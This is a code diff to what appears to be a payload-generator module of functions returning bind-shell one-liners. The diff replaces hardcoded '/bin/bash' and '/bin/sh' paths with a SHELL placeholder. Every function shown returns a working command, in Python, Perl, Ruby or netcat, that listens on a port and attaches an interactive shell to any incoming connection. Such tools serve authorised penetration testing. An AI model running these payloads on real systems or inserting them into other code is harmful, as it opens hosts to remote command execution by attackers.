@@ -3,7 +3,7 @@
 # Bind TCP shells
 
 def BIND_PYTHON_TCP():
-    return """python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',PORT));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])" """
+    return """python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',PORT));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['SHELL','-i'])" """
 
 
 def BIND_PYTHON_UDP():
@@ -11,7 +11,7 @@ def BIND_PYTHON_UDP():
 
 
 def BIND_PERL_TCP():
-    return """perl -e 'use Socket;$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'"""
+    return """perl -e 'use Socket;$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("SHELL -i");};'"""
 
 
 def BIND_PERL_UDP():
@@ -27,7 +27,7 @@ def BIND_PHP_UDP():
 
 
 def BIND_RUBY_TCP():
-    return """ruby -rsocket -e 'f=TCPServer.new(PORT);s=f.accept;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",s,s,s)'"""
+    return """ruby -rsocket -e 'f=TCPServer.new(PORT);s=f.accept;exec sprintf("SHELL -i <&%d >&%d 2>&%d",s,s,s)'"""
 
 
 def BIND_RUBY_UDP():
@@ -35,15 +35,15 @@ def BIND_RUBY_UDP():
 
 
 def BIND_NETCAT_TCP():
-    return """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp PORT >/tmp/f"""
+    return """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|SHELL -i 2>&1|nc -lvp PORT >/tmp/f"""
 
 
 def BIND_NETCAT_TRADITIONAL_TCP():
-    return """nc -lvp PORT -c /bin/bash"""
+    return """nc -lvp PORT -c SHELL"""
 
 
 def BIND_NETCAT_OPENBSD_UDP():
-    return """coproc nc -luvp PORT; exec /bin/bash <&0${COPROC[0]} >&${COPROC[1]} 2>&1"""
+    return """coproc nc -luvp PORT; exec SHELL <&0${COPROC[0]} >&${COPROC[1]} 2>&1"""
 
 
 def BIND_POWERSHELL_TCP():
